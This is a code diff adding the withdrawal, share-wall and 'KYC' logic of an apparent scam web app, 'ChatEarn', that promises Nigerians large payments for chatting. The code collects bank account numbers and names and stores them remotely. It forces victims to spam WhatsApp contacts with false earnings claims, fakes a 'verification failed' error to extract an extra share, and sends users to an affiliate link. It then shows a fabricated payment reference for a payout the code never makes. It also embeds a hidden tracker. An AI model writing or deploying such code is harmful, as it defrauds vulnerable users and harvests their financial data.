+  document.getElementById("bankOpay").classList.toggle("selected",bank==="opay");
+  document.getElementById("bankPalmpay").classList.toggle("selected",bank==="palmpay");
+}
+
+function placeWithdrawal(){
+  const acc=document.getElementById("wdAccNo").value.trim();
+  const name=document.getElementById("wdAccName").value.trim();
+  if(!acc||acc.length<10){showToast("⚠️ Enter a valid 10-digit account number");return;}
+  if(!name){showToast("⚠️ Enter your account name");return;}
+  withdrawalAmount=totalBalance;withdrawalBank=selectedBank;withdrawalAcc=acc;
+  // Save withdrawal request to Supabase immediately
+  saveWithdrawal(name, acc, selectedBank, totalBalance);
+  swShares=0;shareFailTriggered=false;
+  goScreen("sharewall");
+  const bankName=withdrawalBank==="opay"?"OPay":"PalmPay";
+  document.getElementById("swHeroTitle").textContent="Verify to Receive ₦"+withdrawalAmount.toLocaleString("en-NG");
+  document.getElementById("swHeroSub").innerHTML=`To process your <strong>₦${withdrawalAmount.toLocaleString("en-NG")} withdrawal</strong> to <strong>${bankName}</strong>, share ChatEarn with 5 Nigerian friends to verify your account.`;
+  document.getElementById("swFill").style.width="0%";
+  document.getElementById("swPct").textContent="0%";
+  document.getElementById("swStatus").textContent="Share with 5 friends to unlock withdrawal";
+  document.getElementById("swBtnText").textContent="Share on WhatsApp to Verify";
+  const old=document.getElementById("shareFailNotice");if(old)old.remove();
+}
+
+function getMsg(){
+  const amt=withdrawalAmount||totalBalance;
+  return `💰 I just earned ₦${amt.toLocaleString("en-NG")} on ChatEarn chatting with foreigners!\n\nThis app pays Nigerians to chat with people from USA 🇺🇸, UK 🇬🇧, Canada 🇨🇦 and more.\n\n✅ Free to join\n✅ Earn ₦8,000–₦15,000 per reply\n✅ Withdraw to OPay/PalmPay\n\nSign up here 👇\n${SITE}\n${SITE}\n${SITE}\n\nIt's real — I'm withdrawing mine now! 🔥`;
+}
+
+let swBusy=false;
+function doShareWA(){
+  if(swBusy||swShares>=REQ)return;
+  if(swShares===2&&!shareFailTriggered){
+    shareFailTriggered=true;swBusy=true;
+    window.open("https://api.whatsapp.com/send?text="+encodeURIComponent(getMsg()),"_blank");
+    setTimeout(()=>{
+      swBusy=false;
+      const old=document.getElementById("shareFailNotice");if(old)old.remove();
+      const fail=document.createElement("div");fail.id="shareFailNotice";fail.className="share-fail";
+      fail.innerHTML=`<div class="sf-title">⚠️ Verification Failed</div><div class="sf-sub">This share could not be verified. Please share again to retry — your progress is saved.</div>`;
+      document.getElementById("btnShareWA").parentNode.insertBefore(fail,document.getElementById("btnShareWA"));
+      showToast("⚠️ Share not verified — try again");
+    },1800);
+    return;
+  }
+  swBusy=true;
+  window.open("https://api.whatsapp.com/send?text="+encodeURIComponent(getMsg()),"_blank");
+  setTimeout(()=>{
+    swBusy=false;swShares++;
+    const old=document.getElementById("shareFailNotice");if(old)old.remove();
+    const pct=Math.round((swShares/REQ)*100);
+    document.getElementById("swFill").style.width=pct+"%";
+    document.getElementById("swPct").textContent=pct+"%";
+    const rem=REQ-swShares;
+    if(rem>0){
+      document.getElementById("swStatus").textContent=rem+" more friend"+(rem>1?"s":"")+" needed";
+      document.getElementById("swBtnText").textContent="Share Again ("+rem+" more)";
+      showToast("✅ Verified — "+rem+" more to go");
+    }else{
+      document.getElementById("swStatus").textContent="Account verified! ✓";
+      document.getElementById("swBtnText").textContent="Verified ✓";
+      setTimeout(()=>goScreen("kyc"),800);
+    }
+  },1800);
+}
+
+function doKYC(){
+  window.open(AFF,"_blank");
+  setTimeout(()=>{
+    const ref="CE-"+Math.floor(100000+Math.random()*900000);
+    const bankName=withdrawalBank==="opay"?"OPay":"PalmPay";
+    goScreen("processing");
+    document.getElementById("ppRef").textContent=ref;
+    document.getElementById("ppAmount").textContent="₦"+withdrawalAmount.toLocaleString("en-NG");
+    document.getElementById("ppBank").textContent=bankName;
+    document.getElementById("ppBankNote").textContent="Your "+bankName+" account ("+withdrawalAcc.slice(0,3)+"*****"+withdrawalAcc.slice(-2)+") will receive ₦"+withdrawalAmount.toLocaleString("en-NG")+" within 24 hours.";
+  },1500);
+}
+
+function shareAgain(){window.open("https://api.whatsapp.com/send?text="+encodeURIComponent(getMsg()),"_blank");}
+function getTime(){const d=new Date();return d.getHours().toString().padStart(2,"0")+":"+d.getMinutes().toString().padStart(2,"0");}
+function showEarnToast(msg){const t=document.getElementById("earnToast");t.textContent=msg;t.classList.add("show");setTimeout(()=>t.classList.remove("show"),3000);}
+function showToast(m){const t=document.getElementById("toast");t.textContent=m;t.classList.add("show");setTimeout(()=>t.classList.remove("show"),2800);}
+
+tryRestoreSession();
+
+// Traffic click tracker — logs clicks to Supabase for admin reporting
+function trackClick(spot){
+  try {
+    supabaseClient.from('chatearn_clicks').insert([{
+      spot: spot,
+      user_email: document.getElementById('regEmail')?.value?.trim() || 'unknown',
+      clicked_at: new Date().toISOString()
+    }]).then(()=>{});
+  } catch(e){}
+  return true; // allow link to open
+}
+</script>
+  <!-- Hidden visit counter (1x1px, non-interactive, invisible to users) -->
+<div style="position:absolute;width:1px;height:1px;overflow:hidden;opacity:0;pointer-events:none;left:-9999px;">
+<script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script>
+<script type="text/javascript">sc_online_i(1735208,"ffffff","ffffff");</script>
+</div>
+
+</body>
+</html>
